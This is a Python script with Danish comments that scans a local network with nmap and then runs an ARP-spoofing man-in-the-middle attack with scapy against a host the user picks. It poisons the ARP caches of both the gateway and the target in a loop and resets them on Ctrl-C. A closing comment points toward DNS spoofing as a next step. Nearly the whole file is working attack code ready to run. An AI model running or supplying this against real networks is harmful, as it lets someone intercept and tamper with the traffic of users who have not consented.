#!/usr/bin/python3

import netifaces
import ipaddress
import nmap
import yaml
from scapy.all import *
import time
#import proxy

def host_discovery(network):
	global nmscan
	print("\nScanning for active hosts in subnetrange...")
	networkstr = str(network)
	live_hosts = list()
	print (networkstr + "\n")
	#print(type(networkstr))
	try:
		nmscan.scan(hosts=networkstr, arguments= "-sn -PR")
		#print(nmscan.command_line())
		for host in nmscan.all_hosts():
			if "up" in nmscan[host]["status"]["state"]:
				print ("Live: ", host)
				live_hosts.append(host)
			else:
				print (host, ": DOWN")
			#print (nmscan[host])
	except Exception as error:
		print("Something went wrong: \n ", error)
	return live_hosts

def port_scan(live_hosts):
	global nmscan
	try:
		portscan_choice = input("Do you want to portscan devices?\nY/N: ")
		if portscan_choice == "Y" or portscan_choice == "y":
			for hosts in live_hosts:
				try:
					nmscan.scan(hosts=hosts, arguments= "-sC -sV")
					print(f"Scanning {hosts}")
					if "tcp" in nmscan.scaninfo():
						result =  nmscan[hosts]
						#print (result)
						print("Hostname: ", yaml.dump(result['hostnames']))
						print ("Vendor: ", yaml.dump(result['vendor']))
						#print (len(result['tcp']))
						if len(result['tcp']) > 0:
							for i in result['tcp']:
								print ("Port number: ", i )
								print (yaml.dump(result['tcp'][i]))
					else:
						print ("No open TCP ports found")
						
						print ("Lortet virker ikke")
				except Exception as error:
					print(error)
		else:
			print("\nJumping to ARP poisen - choose a target\n")
	except Exception as error:
		print (error)

def find_mac(target_ip):
	arp_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="who-has", pdst=target_ip)
	response_packet = srp(arp_broadcast, timeout=2)
	return response_packet[0][0][1].hwsrc

def arp_spoof(gateway_mac, gateway_ip, target_mac, target_ip): #Vores egen source mac kommer automatisk på
	gateway_arp_pkt = Ether(dst=gateway_mac)/ARP(op="is-at", psrc=target_ip, pdst=gateway_ip) #Fortæl router at min mac adresse er på target IP
	target_arp_pkt = Ether(dst=target_mac)/ARP(op="is-at", psrc=gateway_ip, pdst=target_ip) #Fortæl til target at min MAC adresse er på gateway IP
	#reset_gateway_pkt = Ether(dst=gateway_mac, src=target_mac)/ARP(op="is-at", psrc)
	#reset target_pkt = Ether()/ARP()
	print (f"Starting ARP spoof against {target_ip}")
	try:
		while True:
			sendp(gateway_arp_pkt) #sendp layer 2
			sendp(target_arp_pkt)
			time.sleep(1)
	except Exception as error:
		print (error)

def arp_reset(gateway_mac, gateway_ip, target_mac, target_ip):
	reset_gateway = Ether(dst=gateway_mac, src=target_mac)/ARP(op="is-at", psrc=target_ip, pdst=gateway_ip)
	reset_target_ip = Ether(dst=target_mac, src=gateway_mac)/ARP(op="is-at", psrc=gateway_ip, pdst=target_ip)
	print (f"Resetting ARP table for gateway: {gateway_ip}\n Resetting ARP table for target: {target_ip}")
	try:
		sendp(reset_gateway)
		sendp(reset_target_ip)
	except Exception as error:
		print (error)


interfaces = netifaces.interfaces()
nmscan = nmap.PortScanner()

print ("Available interfaces: \n")
for i in interfaces:
	print (i)
	print ("IPAddress: ", netifaces.ifaddresses(i)[2][0]['addr'])
	print ("Subnetmask: ", netifaces.ifaddresses(i)[2][0]['netmask'])
	print("\n")

try:
	interface_choice = input("Choose the interfaces you want to target (top line in results): ")
	interface = netifaces.ifaddresses(interface_choice)
	ip_address = netifaces.ifaddresses(interface_choice)[2][0]['addr']
	subnet_mask = netifaces.ifaddresses(interface_choice)[2][0]['netmask']

except Exception as error:
	print("Specified interface does not exist - specific error message: \n", error)

print(ip_address)
print(subnet_mask)

try:
	ip_inter = ipaddress.ip_interface(f"{ip_address}/{subnet_mask}")
	network = ip_inter.network # 192.168.171.0/24
	broadcast = ip_inter.network.broadcast_address # 192.168.171.255
	gateway = netifaces.gateways()['default'][2][0]

	host_list = host_discovery(network)
	#print (host_list)
	port_scan(host_list)
	counter = 0
	print ("Gateway IP: ", gateway)
	for i in host_list:
		print (f"[{counter}]   {i}")
		counter += 1
	poisen_choice = input("\nChoose target to poisen - use numbers, eg. 2: ")
	print (host_list[int(poisen_choice)])
	gateway_mac = find_mac(gateway)
	print("Gateway mac: ", gateway_mac)
	target_mac = find_mac(host_list[int(poisen_choice)])
	print ("Target mac: ", target_mac)
	arp_spoof(gateway_mac, gateway, target_mac, host_list[int(poisen_choice)])

except KeyboardInterrupt:
	print("CTRL ^ C was pressed")
	for i in range(20):
		arp_reset(gateway_mac, gateway, target_mac, host_list[int(poisen_choice)])
		time.sleep(1)

# Den her kunne godt virke: https://www.thepythoncode.com/article/make-dns-spoof-python